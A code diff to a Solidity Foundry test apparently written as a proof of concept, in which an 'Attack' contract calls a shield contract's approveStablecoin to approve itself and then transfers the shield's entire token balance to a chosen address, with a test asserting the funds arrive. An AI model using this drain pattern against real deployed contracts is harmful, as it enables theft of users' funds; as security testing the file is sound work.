@@ -7,10 +7,15 @@ import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {Vm} from "forge-std/Vm.sol";
 
 contract Attack {
-    function mockAttack(address token, address shield, address proxy) external {
+    function mockAttack(
+        address token,
+        address shield,
+        address proxy,
+        address storeAssets
+    ) external {
         IShield(shield).approveStablecoin(token, address(this));
         uint256 bal = IERC20(proxy).balanceOf(shield);
-        IERC20(proxy).transferFrom(shield, address(this), bal);
+        IERC20(proxy).transferFrom(shield, storeAssets, bal);
     }
 }
 
@@ -32,6 +37,8 @@ contract testAttack is Test {
     }
 
     function testMockAttack() public {
-        attack.mockAttack(token, shield, proxy);
+        uint256 bal = IERC20(proxy).balanceOf(shield);
+        attack.mockAttack(token, shield, proxy, address(0x01));
+        assertEq(IERC20(token).balanceOf(address(0x01)), bal);
     }
 }
